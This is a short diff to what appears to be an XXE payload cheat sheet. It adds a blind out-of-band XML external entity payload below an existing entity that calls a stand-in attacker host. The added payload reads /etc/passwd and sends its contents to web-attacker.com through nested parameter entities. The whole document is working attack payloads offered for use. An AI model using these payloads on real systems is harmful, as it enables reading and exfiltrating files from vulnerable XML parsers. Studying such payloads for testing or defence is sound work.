@@ -35,3 +35,12 @@ XXE parameter entities
 ```xml
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
 ```
+
+Blind XXE to exfiltrate data out of bound
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
